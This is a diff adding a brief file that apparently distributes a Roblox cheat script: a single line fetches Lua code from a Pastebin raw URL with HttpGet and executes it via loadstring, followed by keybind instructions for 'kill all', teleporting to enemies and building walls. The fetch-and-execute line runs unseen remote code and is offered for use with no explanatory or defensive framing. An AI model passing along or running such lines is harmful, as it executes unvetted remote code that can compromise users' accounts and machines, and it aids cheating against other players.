@@ -1,0 +1,3 @@
+script : loadstring(game:HttpGet(("https://pastebin.com/raw/yCrBkPaY"), true))()
+
+insturctions : Press E : kill all Press T : teleport to an enemy Press F : build a wall infront of You 
